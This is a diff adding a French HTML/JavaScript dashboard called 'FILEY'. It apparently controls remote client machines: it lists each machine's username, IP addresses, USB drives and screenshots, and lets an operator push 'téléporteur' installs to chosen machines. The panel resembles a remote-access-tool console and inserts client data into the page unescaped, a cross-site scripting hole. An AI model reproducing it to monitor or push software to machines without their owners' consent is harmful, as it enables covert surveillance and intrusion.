@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FILEY - Menu</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0e27;
+            color: #00d4ff;
+            font-family: 'Arial', sans-serif;
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 4em;
+            color: #00d4ff;
+            margin-bottom: 50px;
+            letter-spacing: 8px;
+            text-shadow: 0 0 20px #00d4ff;
+        }
+
+        .btn-create {
+            position: fixed;
+            top: 30px;
+            right: 30px;
+            background: #00d4ff;
+            border: none;
+            color: #0a0e27;
+            padding: 15px 40px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.2em;
+            transition: all 0.3s;
+            letter-spacing: 2px;
+            z-index: 100;
+        }
+
+        .btn-create:hover {
+            box-shadow: 0 0 30px #00d4ff;
+            transform: scale(1.05);
+        }
+
+        /* SECTION CLIENTS */
+        .clients-section {
+            border: 2px solid #00d4ff;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            background: rgba(0, 212, 255, 0.03);
+        }
+
+        .section-title {
+            font-size: 1.5em;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .clients-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+        }
+
+        .client-card {
+            background: rgba(0, 212, 255, 0.05);
+            border: 2px solid #00d4ff;
+            border-radius: 10px;
+            padding: 20px;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .client-card:hover {
+            background: rgba(0, 212, 255, 0.15);
+            transform: translateY(-5px);
+        }
+
+        .client-card.offline {
+            border-color: #666;
+            opacity: 0.6;
+        }
+
+        .client-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+
+        .status-dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: #10b981;
+            box-shadow: 0 0 10px #10b981;
+            animation: pulse 2s infinite;
+        }
+
+        .status-dot.offline {
+            background: #ef4444;
+            box-shadow: 0 0 10px #ef4444;
+            animation: none;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .client-code {
+            font-weight: bold;
+            font-size: 1.5em;
+        }
+
+        .client-info {
+            margin: 10px 0;
+        }
+
+        .client-info-line {
+            font-size: 0.9em;
+            color: #00a8cc;
+            margin: 5px 0;
+        }
+
+        .client-screenshot {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            border-radius: 5px;
+            border: 1px solid #00d4ff;
+            margin-top: 10px;
+        }
+
+        .client-nickname {
+            background: rgba(16, 185, 129, 0.2);
+            border: 1px solid #10b981;
+            color: #10b981;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 0.85em;
+            display: inline-block;
+            margin-top: 8px;
+        }
+
+        .usb-badge {
+            background: rgba(245, 158, 11, 0.2);
+            border: 1px solid #f59e0b;
+            color: #f59e0b;
+            padding: 3px 8px;
+            border-radius: 12px;
+            font-size: 0.75em;
+            display: inline-block;
+            margin: 3px;
+        }
+
+        /* SECTION TELEPORTEURS */
+        .teleporters-section {
+            border: 2px solid #00d4ff;
+            border-radius: 15px;
+            padding: 30px;
+            background: rgba(0, 212, 255, 0.03);
+        }
+
+        .teleporters-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        .teleporters-table thead {
+            background: rgba(0, 212, 255, 0.1);
+        }
+
+        .teleporters-table th {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 2px solid #00d4ff;
+            font-size: 1.1em;
+        }
+
+        .teleporters-table td {
+            padding: 15px;
+            border-bottom: 1px solid rgba(0, 212, 255, 0.2);
+        }
+
+        .teleporters-table tr:hover {
+            background: rgba(0, 212, 255, 0.05);
+        }
+
+        .teleporter-name {
+            font-weight: bold;
+            color: #00d4ff;
+            font-size: 1.1em;
+        }
+
+        .teleporter-description {
+            color: #00a8cc;
+            font-size: 0.9em;
+        }
+
+        .codes-badges {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+        }
+
+        .code-badge {
+            background: rgba(16, 185, 129, 0.2);
+            border: 1px solid #10b981;
+            color: #10b981;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 0.85em;
+            font-weight: bold;
+        }
+
+        .btn-open {
+            background: transparent;
+            border: 2px solid #00d4ff;
+            color: #00d4ff;
+            padding: 8px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            margin-right: 5px;
+        }
+
+        .btn-open:hover {
+            background: #00d4ff;
+            color: #0a0e27;
+        }
+
+        .btn-delete {
+            background: none;
+            border: none;
+            color: #ff6b6b;
+            font-size: 1.2em;
+            cursor: pointer;
+            padding: 5px 10px;
+            transition: all 0.3s;
+        }
+
+        .btn-delete:hover {
+            color: #ff0000;
+            transform: scale(1.2);
+        }
+
+        /* MODAL */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: #0a0e27;
+            border: 2px solid #00d4ff;
+            border-radius: 15px;
+            padding: 40px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+        }
+
+        .modal-title {
+            font-size: 1.8em;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 1.1em;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0, 212, 255, 0.05);
+            border: 1px solid #00d4ff;
+            color: #00d4ff;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+
+        .form-textarea {
+            min-height: 100px;
+            resize: vertical;
+            font-family: inherit;
+        }
+
+        .select-all-btn {
+            background: transparent;
+            border: 2px solid #f59e0b;
+            color: #f59e0b;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.9em;
+            margin-bottom: 15px;
+            transition: all 0.3s;
+        }
+
+        .select-all-btn:hover {
+            background: #f59e0b;
+            color: #0a0e27;
+        }
+
+        .client-checkbox-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: rgba(0, 212, 255, 0.05);
+            border-radius: 5px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .client-checkbox-item:hover {
+            background: rgba(0, 212, 255, 0.15);
+        }
+
+        .client-checkbox-item.selected {
+            background: rgba(16, 185, 129, 0.2);
+            border-left: 3px solid #10b981;
+        }
+
+        .client-checkbox-item.offline-item {
+            opacity: 0.5;
+        }
+
+        .checkbox-custom {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #00d4ff;
+            border-radius: 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .checkbox-custom.checked {
+            background: #10b981;
+            border-color: #10b981;
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 30px;
+        }
+
+        .btn-modal {
+            padding: 12px 30px;
+            border: 2px solid #00d4ff;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .btn-cancel {
+            background: transparent;
+            color: #00d4ff;
+        }
+
+        .btn-cancel:hover {
+            background: rgba(0, 212, 255, 0.1);
+        }
+
+        .btn-submit {
+            background: #00d4ff;
+            color: #0a0e27;
+            border-color: #00d4ff;
+        }
+
+        .btn-submit:hover {
+            box-shadow: 0 0 20px #00d4ff;
+        }
+
+        .empty {
+            text-align: center;
+            color: #00a8cc;
+            padding: 40px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>FILEY</h1>
+        
+        <button class="btn-create" onclick="openCreateModal()">+ Créer</button>
+
+        <!-- CLIENTS -->
+        <div class="clients-section">
+            <div class="section-title">Clients Connectés</div>
+            <div id="clientsGrid" class="clients-grid"></div>
+        </div>
+
+        <!-- TELEPORTEURS -->
+        <div class="teleporters-section">
+            <div class="section-title">Téléporteurs</div>
+            <table class="teleporters-table">
+                <thead>
+                    <tr>
+                        <th>Nom du téléporteur</th>
+                        <th>Description</th>
+                        <th>Codes cibles</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="teleportersTable"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- MODAL CREATION -->
+    <div class="modal" id="createModal">
+        <div class="modal-content">
+            <div class="modal-title">Créer un Téléporteur</div>
+            
+            <div class="form-group">
+                <label class="form-label">Nom du téléporteur</label>
+                <input type="text" class="form-input" id="teleporterName" placeholder="Ex: Installation Logiciel v2">
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Description</label>
+                <textarea class="form-input form-textarea" id="teleporterDescription" placeholder="Ex: Installation automatique du logiciel"></textarea>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label">Sélectionner les clients cibles</label>
+                <button class="select-all-btn" onclick="toggleSelectAll()">Sélectionner tous (en ligne uniquement)</button>
+                <div id="clientsSelection"></div>
+            </div>
+
+            <div class="modal-actions">
+                <button class="btn-modal btn-cancel" onclick="closeCreateModal()">Annuler</button>
+                <button class="btn-modal btn-submit" onclick="createTeleporter()">✓ Créer</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const SUPABASE_URL = "https://tjiqssgrxvxnjqhewtrt.supabase.co";
+        const SUPABASE_KEY = "sb_publishable_IUb-C1nf11c98QajH_MTVw_8ZQGhMWp";
+      
+        const CLIENTS_TABLE = "clients";
+        const TELEPORTERS_TABLE = "filey_teleporters";
+        
+        const CLIENTS_URL = `${SUPABASE_URL}/rest/v1/${CLIENTS_TABLE}`;
+        const TELEPORTERS_URL = `${SUPABASE_URL}/rest/v1/${TELEPORTERS_TABLE}`;
+
+        let clients = [];
+        let teleporters = [];
+        let selectedClientCodes = [];
+
+        // VERIFIER SI CLIENT EN LIGNE
+        function isClientOnline(lastSeen) {
+            const now = Date.now();
+            const lastSeenTime = new Date(lastSeen).getTime();
+            const diffSeconds = (now - lastSeenTime) / 1000;
+            return diffSeconds < 30; // En ligne si moins de 30 secondes
+        }
+
+        // CHARGER LES CLIENTS
+        async function loadClients() {
+            try {
+                const response = await fetch(CLIENTS_URL + '?select=*&order=id.desc', {
+                    headers: {
+                        "Authorization": `Bearer ${SUPABASE_KEY}`,
+                        "apikey": SUPABASE_KEY
+                    }
+                });
+
+                clients = await response.json();
+                displayClients();
+            } catch (error) {
+                console.error("Erreur chargement clients:", error);
+            }
+        }
+
+        function displayClients() {
+            const container = document.getElementById('clientsGrid');
+            
+            if (!clients || clients.length === 0) {
+                container.innerHTML = '<div class="empty">Aucun client</div>';
+                return;
+            }
+
+            const items = clients.map(client => {
+                const online = isClientOnline(client.last_seen);
+                
+                // Parser USB drives
+                let usbBadges = '';
+                if (client.usb_drives) {
+                    try {
+                        const usbs = JSON.parse(client.usb_drives);
+                        usbBadges = usbs.map(usb => 
+                            `<span class="usb-badge">💾 ${usb.drive} ${usb.name}</span>`
+                        ).join('');
+                    } catch (e) {}
+                }
+                
+                return `
+                    <div class="client-card ${!online ? 'offline' : ''}">
+                        <div class="client-status">
+                            <span class="status-dot ${!online ? 'offline' : ''}"></span>
+                            <span class="client-code">${client.code}</span>
+                        </div>
+                        ${client.nickname ? `<div class="client-nickname">📌 ${client.nickname}</div>` : ''}
+                        <div class="client-info">
+                            <div class="client-info-line">👤 ${client.username || 'Utilisateur'}</div>
+                            <div class="client-info-line">💻 ${client.computer_name || 'Ordinateur'}</div>
+                            ${client.ip_local ? `<div class="client-info-line">🌐 ${client.ip_local}</div>` : ''}
+                            ${client.ip_public ? `<div class="client-info-line">🌍 ${client.ip_public}</div>` : ''}
+                        </div>
+                        ${usbBadges}
+                        ${client.screenshot_url ? `<img src="${client.screenshot_url}" class="client-screenshot" alt="Screenshot">` : ''}
+                    </div>
+                `;
+            }).join('');
+
+            container.innerHTML = items;
+        }
+
+        // CHARGER LES TELEPORTEURS
+        async function loadTeleporters() {
+            try {
+                const response = await fetch(TELEPORTERS_URL + '?select=*&order=id.desc', {
+                    headers: {
+                        "Authorization": `Bearer ${SUPABASE_KEY}`,
+                        "apikey": SUPABASE_KEY
+                    }
+                });
+
+                teleporters = await response.json();
+                displayTeleporters();
+            } catch (error) {
+                console.error("Erreur chargement téléporteurs:", error);
+            }
+        }
+
+        function displayTeleporters() {
+            const tbody = document.getElementById('teleportersTable');
+            
+            if (!teleporters || teleporters.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4" class="empty">Aucun téléporteur</td></tr>';
+                return;
+            }
+
+            const rows = teleporters.map(t => {
+                const targetCodes = JSON.parse(t.target_codes || '[]');
+                const codesBadges = targetCodes.map(code => 
+                    `<span class="code-badge">${code}</span>`
+                ).join('');
+                
+                return `
+                    <tr>
+                        <td><div class="teleporter-name">${t.name}</div></td>
+                        <td><div class="teleporter-description">${t.description || '-'}</div></td>
+                        <td><div class="codes-badges">${codesBadges}</div></td>
+                        <td>
+                            <button class="btn-open" onclick="openTeleporter(${t.id})">Ouvrir</button>
+                            <button class="btn-delete" onclick="deleteTeleporter(${t.id})">✕</button>
+                        </td>
+                    </tr>
+                `;
+            }).join('');
+
+            tbody.innerHTML = rows;
+        }
+
+        // MODAL
+        function openCreateModal() {
+            document.getElementById('createModal').classList.add('active');
+            displayClientsSelection();
+        }
+
+        function closeCreateModal() {
+            document.getElementById('createModal').classList.remove('active');
+            document.getElementById('teleporterName').value = '';
+            document.getElementById('teleporterDescription').value = '';
+            selectedClientCodes = [];
+        }
+
+        function displayClientsSelection() {
+            const container = document.getElementById('clientsSelection');
+            
+            if (!clients || clients.length === 0) {
+                container.innerHTML = '<div class="empty" style="padding: 20px;">Aucun client disponible</div>';
+                return;
+            }
+
+            const items = clients.map(client => {
+                const isSelected = selectedClientCodes.includes(client.code);
+                const online = isClientOnline(client.last_seen);
+                
+                return `
+                    <div class="client-checkbox-item ${isSelected ? 'selected' : ''} ${!online ? 'offline-item' : ''}" onclick="toggleClient('${client.code}')">
+                        <div class="checkbox-custom ${isSelected ? 'checked' : ''}" id="check-${client.code}">
+                            ${isSelected ? '✓' : ''}
+                        </div>
+                        <div style="flex: 1;">
+                            <div style="font-weight: bold;">${client.code} ${!online ? '(HORS LIGNE)' : ''}</div>
+                            <div style="font-size: 0.85em; color: #00a8cc;">👤 ${client.username || 'Utilisateur'} - 💻 ${client.computer_name || 'Ordinateur'}</div>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+
+            container.innerHTML = items;
+        }
+
+        function toggleClient(code) {
+            const index = selectedClientCodes.indexOf(code);
+            if (index > -1) {
+                selectedClientCodes.splice(index, 1);
+            } else {
+                selectedClientCodes.push(code);
+            }
+            displayClientsSelection();
+        }
+
+        function toggleSelectAll() {
+            // Sélectionner seulement les clients EN LIGNE
+            const onlineClients = clients.filter(c => isClientOnline(c.last_seen));
+            
+            if (selectedClientCodes.length === onlineClients.length) {
+                selectedClientCodes = [];
+            } else {
+                selectedClientCodes = onlineClients.map(c => c.code);
+            }
+            displayClientsSelection();
+        }
+
+        // CREER TELEPORTEUR
+        async function createTeleporter() {
+            const name = document.getElementById('teleporterName').value.trim();
+            const description = document.getElementById('teleporterDescription').value.trim();
+
+            if (!name) {
+                alert('Entrez un nom pour le téléporteur');
+                return;
+            }
+
+            if (selectedClientCodes.length === 0) {
+                alert('Sélectionnez au moins un client cible');
+                return;
+            }
+
+            const data = {
+                name: name,
+                description: description,
+                target_codes: JSON.stringify(selectedClientCodes),
+                created_at: new Date().toISOString()
+            };
+
+            try {
+                const response = await fetch(TELEPORTERS_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "Authorization": `Bearer ${SUPABASE_KEY}`,
+                        "apikey": SUPABASE_KEY
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    alert('✅ Téléporteur créé avec succès !');
+                    closeCreateModal();
+                    loadTeleporters();
+                } else {
+                    alert('❌ Erreur lors de la création');
+                }
+            } catch (error) {
+                console.error("Erreur création:", error);
+                alert('❌ Erreur réseau');
+            }
+        }
+
+        // SUPPRIMER TELEPORTEUR
+        async function deleteTeleporter(id) {
+            if (!confirm('Supprimer ce téléporteur ?')) return;
+
+            try {
+                const response = await fetch(TELEPORTERS_URL + '?id=eq.' + id, {
+                    method: "DELETE",
+                    headers: {
+                        "Authorization": `Bearer ${SUPABASE_KEY}`,
+                        "apikey": SUPABASE_KEY
+                    }
+                });
+
+                if (response.ok) {
+                    loadTeleporters();
+                }
+            } catch (error) {
+                console.error("Erreur suppression:", error);
+            }
+        }
+
+        // OUVRIR TELEPORTEUR
+        function openTeleporter(id) {
+            window.open(`teleporter.html?id=${id}`, '_blank');
+        }
+
+        // DEMARRAGE
+        loadClients();
+        loadTeleporters();
+        setInterval(loadClients, 5000);
+        setInterval(loadTeleporters, 5000);
+    </script>
+</body>
+</html>
